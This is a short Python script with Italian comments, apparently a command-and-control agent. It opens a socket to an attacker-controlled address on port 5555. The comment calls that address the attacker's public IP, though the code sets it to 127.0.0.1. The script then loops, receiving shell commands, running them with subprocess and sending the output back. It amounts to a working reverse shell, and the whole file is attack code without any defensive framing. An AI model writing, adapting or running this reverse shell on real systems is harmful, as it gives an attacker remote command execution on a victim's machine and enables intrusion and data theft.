import socket
import subprocess
import os

def c2_agent():
    SERVER_IP = '127.0.0.1' # l'IP pubblico dell'attaccante
    PORT = 5555

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.connect((SERVER_IP, PORT))
    except Exception as e:
        print(f"Errore connessione: {e}")
        return

    while True:
        # Riceve il comando
        command = s.recv(1024).decode()

        if command.lower() == 'exit':
            break
        
        # Gestione speciale per 'cd' (change directory)
        if command.startswith('cd '):
            try:
                os.chdir(command[3:])
                s.send(f"Directory cambiata in: {os.getcwd()}".encode())
            except Exception as e:
                s.send(str(e).encode())
            continue

        # Esecuzione comando di sistema
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output, error = proc.communicate()

        # Invia indietro l'output
        s.send(output + error)

    s.close()

if __name__ == '__main__':
    c2_agent()